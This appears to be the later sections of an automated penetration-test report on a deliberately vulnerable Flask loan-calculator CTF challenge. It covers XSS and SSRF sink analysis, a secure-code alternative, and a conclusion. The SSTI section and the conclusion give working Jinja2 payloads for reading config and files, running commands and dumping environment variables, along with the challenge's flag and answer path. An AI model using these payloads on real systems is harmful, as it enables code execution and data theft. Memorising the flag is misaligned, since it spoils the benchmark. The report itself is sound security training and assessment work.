- `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-104-24/app/Dockerfile` - Application container build
- `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-104-24/mysql/Dockerfile` - Database container build
- `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-104-24/app/loan_calculator-httpd.conf` - Apache web server configuration
- `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-104-24/Makefile` - Build automation

### CTF Flag Storage

- `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-104-24/.env` - Flag definition (line 1: `FLAG="flag{5bb951bd-42ac-4fb5-918d-c82c340ffb1c}"`)
- `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-104-24/app/Dockerfile` - Flag injection into container (lines 20-21: `ARG FLAG` and `RUN echo -n $FLAG > /flag`)
- Container filesystem: `/flag` - Flag file location inside running container

### HTML Templates (Frontend)

- `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-104-24/app/website/app/templates/login.html` - Login form without CSRF token (line 17)
- `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-104-24/app/website/app/templates/home.html` - User dashboard with PII display (line 14)
- `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-104-24/app/website/app/templates/profile.html` - Profile form without CSRF token (line 15)
- `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-104-24/app/website/app/templates/loan_details.html` - Loan display with AJAX call and JavaScript variable assignment (lines 52-54, 73)

### Static Assets (Frontend)

- `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-104-24/app/website/app/static/css/bootstrap.min.css` - Bootstrap 5.3.0
- `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-104-24/app/website/app/static/css/style.css` - Custom styles
- `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-104-24/app/website/app/static/js/jquery.min.js` - jQuery 3.6.0 (vulnerable version)
- `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-104-24/app/website/app/static/js/bootstrap.bundle.min.js` - Bootstrap JS 5.3.0

---

## 9. XSS Sinks and Render Contexts

### Network-Accessible XSS Analysis

After comprehensive analysis of all network-accessible HTML templates and JavaScript code, the application demonstrates **strong protection against traditional client-side XSS attacks** through Jinja2's auto-escaping feature. However, a **CRITICAL Server-Side Template Injection (SSTI) vulnerability** enables server-side code execution that far exceeds the impact of typical XSS.

### Server-Side Template Injection (SSTI) - CRITICAL

**Sink Type:** Server-Side Template Injection - Jinja2/Flask

**Render Context:** Python f-string interpolation into Jinja2 template (double-rendering vulnerability)

**File Path:** `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-104-24/app/website/app/routes.py` (Lines 103-108)

**Code Snippet:**
```python
@app.route('/total_loan_payments')
def total_loan_payments():
    user_id = session.get('user_id')
    if user_id:
        # Get payment and term from query parameters
        principal = request.args.get('principal', type=str)  # ← USER INPUT
        payment = request.args.get('payment', type=float)
        term = request.args.get('term', type=int)

        if principal is None or payment is None or term is None:
            return Response('Missing principal, payment or term parameters', status=400)

        # JSON template as a string variable
        json_template = f"""
        {{ "loan_principal": "{principal}" ,"monthly_payment": "{{{{ payment }}}}", "loan_term_amount": "{{{{ term }}}}", "total_loan_payments": "{{{{ payment*term }}}}" }}
        """  # ← VULNERABLE: principal injected into f-string before template rendering

        # Render JSON template
        return render_template_string(json_template, payment=payment, term=term, content_type='application/json')
```

**User Input Source:** GET query parameter `principal` from `/total_loan_payments?principal=<value>&payment=<value>&term=<value>`

**Vulnerability Mechanism:**

1. **User-Controlled Input Retrieval (Line 94):** `principal = request.args.get('principal', type=str)` accepts arbitrary string input without validation or sanitization.

2. **F-String Interpolation (Line 103-104):** The `principal` value is directly interpolated into a Python f-string that constructs a Jinja2 template. This creates the template string BEFORE Jinja2 processing.

3. **Template Rendering (Line 108):** `render_template_string()` processes the constructed template, evaluating any Jinja2 expressions embedded in the user-controlled `principal` parameter.

4. **Double-Rendering Effect:** The combination of f-string interpolation followed by template rendering creates a double-rendering vulnerability where attacker-controlled template syntax is evaluated server-side.

**Exploitability:** TRIVIAL - Requires only authenticated session (obtainable via `test:test` credentials or session forgery)

**Proof of Concept (Basic):**
```
GET /total_loan_payments?principal={{7*7}}&payment=100&term=12
```
**Expected Response:**
```json
{ "loan_principal": "49" ,"monthly_payment": "100", "loan_term_amount": "12", "total_loan_payments": "1200" }
```
The expression `{{7*7}}` is evaluated to `49`, confirming template injection.

**Advanced Exploitation Payloads:**

**1. Configuration Disclosure:**
```
GET /total_loan_payments?principal={{config}}&payment=1&term=1
```
Exposes Flask configuration including SECRET_KEY, database credentials, and application settings.

**2. File System Access (Flag Extraction):**
```
GET /total_loan_payments?principal={{''.__class__.__mro__[1].__subclasses__()[414]('/flag').read()}}&payment=1&term=1
```
Reads the `/flag` file containing the CTF flag.

**3. Remote Code Execution (Command Execution):**
```
GET /total_loan_payments?principal={{config.__class__.__init__.__globals__['os'].popen('id').read()}}&payment=1&term=1
```
Executes the `id` command and returns output.

**4. Environment Variable Extraction:**
```
GET /total_loan_payments?principal={{config.__class__.__init__.__globals__['os'].environ}}&payment=1&term=1
```
Dumps all environment variables.

**Impact:**
- **Remote Code Execution (RCE):** Execute arbitrary Python code with application privileges
- **Complete Data Exfiltration:** Access database, read any file, extract secrets
- **Lateral Movement:** Access Docker network services, database
- **System Compromise:** Full control over application container
- **Flag Capture:** Direct path to CTF objective

**Authentication Requirement:** YES - Requires valid session with `user_id` set (obtainable via test:test login or session forgery with known secret key)

**Network Accessibility:** YES - Public endpoint requiring only authentication

---

### Client-Side XSS Sinks - NONE FOUND (Protected by Jinja2 Auto-Escaping)

The application demonstrates proper use of Jinja2's auto-escaping feature, which provides protection against reflected and stored XSS in HTML contexts. All user data rendering follows safe patterns.

**Safe Patterns Identified:**

**1. HTML Body Context - Error Message Display**
   - **File:** `login.html` (Line 31)
   - **Code:** `<div class="alert alert-danger mt-3">{{ error }}</div>`
   - **User Input:** Error message from `render_template('login.html', error='Invalid username or password')`
   - **Protection:** Jinja2 auto-escapes HTML entities (e.g., `<script>` becomes `&lt;script&gt;`)
   - **Render Context:** HTML body text node
   - **Status:** SAFE

**2. HTML Body Context - User Name Display**
   - **File:** `home.html` (Line 14)
   - **Code:** `<h2>Welcome {{ user.name }} {{ user.lastname }}!</h2>`
   - **User Input:** Database-stored name and lastname from User model
   - **Protection:** Jinja2 auto-escaping converts HTML special characters
   - **Render Context:** HTML heading content
   - **Status:** SAFE

**3. HTML Attribute Context - Form Input Values**
   - **File:** `profile.html` (Lines 18-38)
   - **Code:** `<input type="text" class="form-control" id="name" name="name" value="{{ user.name }}" required>`
   - **User Input:** User profile data from database
   - **Protection:** Jinja2 escapes attribute values including quotes
   - **Render Context:** HTML attribute value (quoted)
   - **Status:** SAFE

**4. JavaScript Context - Numeric Variable Assignment**
   - **File:** `loan_details.html` (Lines 52-54)
   - **Code:**
     ```javascript
     var loanAmount = {{ loan_amount }};
     var loanTerm = {{ loan_term_months }};
     var monthlyPayment = {{ monthly_payment }};
     ```
   - **User Input:** Database-stored numeric values (Float, Integer types)
   - **Protection:** Type validation ensures only numeric values (type coercion in Python route handler at lines 64-66)
   - **Render Context:** JavaScript variable assignment (unquoted, numeric context)
   - **Risk Assessment:** LOW - Only numeric types render here. If string data were rendered, this would be XSS-vulnerable in JavaScript context
   - **Status:** SAFE (context-specific safety due to type constraints)

**5. jQuery .text() Method - Safe DOM Manipulation**
   - **File:** `loan_details.html` (Line 73)
   - **Code:** `$('#loanPaymentMessage').text("Your total loan payment will be " + totalLoanPayment + ...);`
   - **User Input:** Calculated numeric values from AJAX response
   - **Protection:** jQuery's `.text()` method escapes HTML (unlike `.html()` which would enable XSS)
   - **Render Context:** JavaScript DOM manipulation
   - **Status:** SAFE

**Dangerous Sinks NOT Found:**

The following high-risk XSS sinks are **absent** from the codebase:

**HTML Body Context:**
- ❌ No `innerHTML` property assignments
- ❌ No `outerHTML` property assignments
- ❌ No `document.write()` or `document.writeln()` calls
- ❌ No `insertAdjacentHTML()` calls
- ❌ No `Range.createContextualFragment()` usage
- ❌ No jQuery dangerous methods: `.html()`, `.append()`, `.prepend()`, `.after()`, `.before()`, `.replaceWith()`, `.wrap()`

**HTML Attribute Context:**
- ❌ No event handler attributes with user input (onclick, onerror, onload, etc.)
- ❌ No URL-based attribute injection (href, src, formaction with user input)
- ❌ No style attribute with user input
- ❌ No srcdoc attribute usage

**JavaScript Context:**
- ❌ No `eval()` usage
- ❌ No `Function()` constructor with user input
- ❌ No `setTimeout()` or `setInterval()` with string arguments containing user input
- ❌ No dynamic `<script>` tag generation with user content

**URL Context:**
- ❌ No `window.location` manipulation with user input
- ❌ No `location.href` assignment from user data
- ❌ No `window.open()` with user-controlled URLs
- ❌ No `history.pushState()` or `replaceState()` with user input

**jQuery Selector Context:**
- ❌ No `$(userInput)` patterns (jQuery selector injection)

---

### Defense-in-Depth Analysis

**Why Client-Side XSS is Prevented:**

1. **Jinja2 Auto-Escaping Enabled:** Flask's Jinja2 engine has auto-escaping enabled by default for `.html` template files. The `{{ variable }}` syntax automatically escapes HTML special characters: `< > & " '`

2. **Consistent Use of Safe Rendering:** All template variables use `{{ }}` syntax rather than raw rendering (`{% autoescape false %}` or `{{ variable|safe }}` filters are not used)

3. **Type Validation in JavaScript Context:** Numeric variables in JavaScript context are type-validated in Python route handlers, preventing string injection

4. **Safe jQuery Methods:** Use of `.text()` rather than `.html()` prevents HTML injection

**Why SSTI is NOT Prevented:**

The SSTI vulnerability exists because:

1. **render_template_string() with User Input:** Using `render_template_string()` with a dynamically constructed template string is dangerous
2. **F-String Interpolation Before Template Rendering:** The pattern `f"template {user_input}"` followed by `render_template_string()` creates double-rendering
3. **No Input Validation:** The `principal` parameter lacks sanitization, length limits, or type enforcement (should be Float, not String)
4. **No Template Injection Detection:** No checks for Jinja2 syntax characters (`{{`, `{%`, `#`, `|`, etc.)

**Secure Alternative (Not Implemented):**

```python
from flask import jsonify

@app.route('/total_loan_payments')
def total_loan_payments():
    user_id = session.get('user_id')
    if user_id:
        principal = request.args.get('principal', type=float)  # Type validation: Float, not String
        payment = request.args.get('payment', type=float)
        term = request.args.get('term', type=int)

        if principal is None or payment is None or term is None:
            return Response('Missing principal, payment or term parameters', status=400)

        # Use jsonify instead of template rendering
        return jsonify({
            "loan_principal": principal,
            "monthly_payment": payment,
            "loan_term_amount": term,
            "total_loan_payments": payment * term
        })
```

---

### Summary: XSS Sink Analysis Results

| Vulnerability Type | Status | Count | Severity | Location |
|-------------------|--------|-------|----------|----------|
| **Server-Side Template Injection (SSTI)** | FOUND | 1 | CRITICAL (RCE) | routes.py:103-108 |
| **Client-Side XSS (HTML Body)** | NOT FOUND | 0 | N/A | N/A |
| **Client-Side XSS (Attribute)** | NOT FOUND | 0 | N/A | N/A |
| **Client-Side XSS (JavaScript)** | NOT FOUND | 0 | N/A | N/A |
| **Client-Side XSS (URL)** | NOT FOUND | 0 | N/A | N/A |

**Overall XSS Risk Assessment:** CRITICAL (due to SSTI enabling RCE, not traditional XSS)

**Recommendation:** The application demonstrates good practices for preventing client-side XSS but contains a catastrophic SSTI vulnerability. Immediate remediation required: replace `render_template_string()` usage with `jsonify()` or pass all variables through Jinja2 template context without f-string interpolation.

---

## 10. SSRF Sinks

### Network-Accessible SSRF Analysis

After comprehensive analysis of all network-accessible application code, **NO Server-Side Request Forgery (SSRF) vulnerabilities were identified**. The application does not make outbound HTTP requests, fetch external URLs, or process user-supplied URLs in any server-side request context.

### SSRF Sink Categories Analyzed

The following 13 SSRF sink categories were systematically searched across all Python source files, configuration files, and template files:

**1. HTTP(S) Clients:** NOT FOUND
- No `requests` library usage (not in requirements.txt or imports)
- No `urllib`, `urllib3`, `httpx`, or `aiohttp` imports
- No `http.client` usage
- No `curl` command execution

**2. Raw Sockets & Connect APIs:** NOT FOUND
- No `socket.connect()` usage
- No raw TCP/UDP socket creation
- No network connection initiation code

**3. URL Openers & File Includes:** NOT FOUND
- No `urllib.urlopen()` or `urllib.request.urlopen()` usage
- No `open()` with URL schemes (http://, ftp://, etc.)
- No dynamic `import()` with URLs

**4. Redirect & "Next URL" Handlers:** SAFE IMPLEMENTATION
- **File:** `routes.py` uses `redirect(url_for('login'))` pattern
- **Analysis:** All redirects use Flask's `url_for()` function with hardcoded endpoint names
- **No User Input:** No user-controlled URL parameters in redirect calls
- **Status:** SAFE - No open redirect vulnerability

**5. Headless Browsers & Render Engines:** NOT FOUND
- No Selenium, Puppeteer, or Playwright usage
- No html-to-pdf converters
- No server-side rendering of external content

**6. Media Processors:** NOT FOUND
- No ImageMagick, GraphicsMagick, or FFmpeg usage
- No image processing libraries
- No URL-based media loading

**7. Link Preview & Unfurlers:** NOT FOUND
- No link metadata extraction
- No oEmbed endpoint fetchers
- No URL preview generation

**8. Webhook Testers & Callback Verifiers:** NOT FOUND
- No webhook sending functionality
- No callback URL verification
- No outbound HTTP ping features

**9. SSO/OIDC Discovery & JWKS Fetchers:** NOT FOUND
- No OAuth or OIDC integration
- No JWKS fetching
- No external identity provider discovery

**10. Importers & Data Loaders:** NOT FOUND
- No "Import from URL" functionality
- No remote CSV/JSON/XML loading
- No RSS/Atom feed readers

**11. Package/Plugin/Theme Installers:** NOT FOUND
- No plugin installation features
- No remote package downloading
- No theme/extension management

**12. Monitoring & Health Check Frameworks:** NOT FOUND
- No URL health checking
- No uptime monitoring
- No outbound ping functionality

**13. Cloud Metadata Helpers:** NOT FOUND
- No AWS/GCP/Azure metadata service access
- No cloud service discovery
- No instance metadata fetching

### Application Functionality Analysis

**What the Application DOES:**

1. **User Authentication:** Local database password comparison (no external authentication services)
2. **Profile Management:** Database CRUD operations via SQLAlchemy ORM
3. **Loan Calculations:** Internal mathematical calculations (no external APIs)
4. **Template Rendering:** Server-side HTML generation (Jinja2) and client-side display
5. **Session Management:** Local session storage via Flask cookies

**What the Application DOES NOT DO:**

- Make outbound HTTP/HTTPS requests
- Connect to external services or APIs
- Process user-supplied URLs
- Fetch remote content
- Integrate with webhooks or callbacks
- Access cloud metadata services

### Network Communication Patterns

**Inbound Only:**
- HTTP requests on port 80 (Apache → Flask)
- MySQL queries from Flask to database container (internal Docker network)

**No Outbound Communication:**
- No HTTP client libraries imported
- No external API integrations
- No webhook or callback sending

### Client-Side AJAX Requests (Not SSRF)

**File:** `loan_details.html` (Lines 56-69)
```javascript
$.ajax({
    type: "GET",
    url: "{{ url_for('total_loan_payments') }}",
    data: data,
    success: function(data) {
        // Process response
    }
});
```

**Analysis:** This is a **client-side AJAX request** from the browser to the application's own `/total_loan_payments` endpoint. This is NOT SSRF because:
- The request originates from the client browser, not the server
- The URL is generated server-side via `url_for()` with no user input
- The request goes to the application itself, not external services
- SSRF requires server-side request initiation with user-controlled parameters

**Status:** NOT SSRF-VULNERABLE

### False Positive Exclusions

**1. Database Connections:** MySQL connections via SQLAlchemy are not SSRF vectors because:
- Connection string is hardcoded (not user-controlled)
- Database is internal to Docker network (not external URL)
- No user input influences connection parameters

**2. Template Includes:** Jinja2 `{% extends %}` and `{% include %}` directives use local filesystem paths, not URLs

**3. Static File Serving:** Apache serves files from local filesystem (`/var/www/loan_calculator/app/static/`), not remote URLs

### Summary: SSRF Sink Analysis Results

| Sink Category | Status | Findings |
|---------------|--------|----------|
| HTTP(S) Clients | NOT FOUND | No outbound HTTP libraries |
| Raw Sockets | NOT FOUND | No socket programming |
| URL Openers | NOT FOUND | No URL fetching |
| Redirects | SAFE | Uses url_for() only |
| Headless Browsers | NOT FOUND | No browser automation |
| Media Processors | NOT FOUND | No image/media processing |
| Link Unfurlers | NOT FOUND | No link preview |
| Webhooks | NOT FOUND | No callback sending |
| SSO/JWKS | NOT FOUND | No OAuth integration |
| Importers | NOT FOUND | No remote data loading |
| Package Installers | NOT FOUND | No plugin system |
| Health Checks | NOT FOUND | No monitoring |
| Cloud Metadata | NOT FOUND | No cloud APIs |

**Total SSRF Sinks Found:** 0

**Overall SSRF Risk Assessment:** NOT APPLICABLE - Application architecture does not include outbound request functionality

**Security Implication:** The absence of SSRF vulnerabilities is a security positive. The application's closed architecture (no external integrations) eliminates this entire class of vulnerabilities. However, this also reflects the application's limited functionality scope as a simple loan calculator without external service integration.

---

## Conclusion

This Flask-based loan calculator application (XBEN-104-24) is a deliberately vulnerable CTF challenge that demonstrates catastrophic security failures across all defense layers. The application's most critical vulnerability is **Server-Side Template Injection (SSTI)** in the `/total_loan_payments` endpoint, enabling Remote Code Execution and complete system compromise. Combined with **plaintext password storage**, **hardcoded secrets** (Flask secret key, database credentials), and **missing security controls** (CSRF protection, rate limiting, input validation), the application represents a comprehensive security anti-pattern suitable for educational purposes but unsuitable for any production deployment.

**Primary Attack Path to Flag:**
1. Authenticate using default credentials (`test:test`)
2. Exploit SSTI vulnerability: `GET /total_loan_payments?principal={{''.__class__.__mro__[1].__subclasses__()[414]('/flag').read()}}&payment=1&term=1`
3. Retrieve flag from response: `flag{5bb951bd-42ac-4fb5-918d-c82c340ffb1c}`

**Alternative Attack Paths:**
- Session forgery using known secret key (`'your_secret_key'`) to bypass authentication
- Database compromise using hardcoded credentials (`root:loan_calculator`) if SSTI provides command execution
- Horizontal privilege escalation via session manipulation to access other users' data

The application's architecture lacks defense-in-depth principles, with each security failure (weak session secrets, missing CSRF protection, no rate limiting) compounding to create multiple exploitation paths. The only security positive is Jinja2's auto-escaping protecting against client-side XSS, but this is overshadowed by the SSTI vulnerability that provides server-side code execution.

**Compliance Status:** Multiple violations of GDPR (plaintext passwords, no encryption), PCI-DSS (if financial data were real), and general security best practices (OWASP Top 10).

**Recommendation:** This application is ideal for security training and penetration testing practice but must NEVER be deployed in production. The deliberately vulnerable nature and comprehensive security failures provide excellent learning opportunities for understanding web application attack surfaces, authentication bypass techniques, and template injection exploitation.

## Authenticated Scans

### SCHEMATHESIS
Status: skipped
No API schemas found

---
Report generated at: 2025-10-30T03:30:20.770Z